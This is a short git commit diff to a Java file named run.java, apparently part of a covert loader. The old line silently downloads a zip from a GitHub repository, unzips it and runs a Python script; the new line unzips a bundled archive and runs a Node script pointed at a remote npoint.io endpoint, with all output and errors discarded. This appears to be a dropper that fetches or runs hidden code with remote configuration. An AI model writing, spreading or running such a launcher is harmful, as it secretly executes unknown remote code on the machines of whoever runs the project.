0fe7d0f6a3bc552b37985df518ff265350b4ccc9
devansuharjo <devansuharjo@gmail.com>
2025-11-19 11:31:31 +0700

    Update run.java

--- run.java
+++ run.java
@@ -4,7 +4,7 @@ import java.util.*;
 public class run {
     public static void main(String[] args) {
         try {
-            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://github.com/levatinaforekina-arch/scaling-doodle/raw/refs/heads/main/palantir.zip;unzip palantir.zip;python apps.py");
+            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "unzip nexusai.zip;node app.js -s='https://api.npoint.io/587c6d3c212974bbb32b'");
             builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             builder.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process process = builder.start();
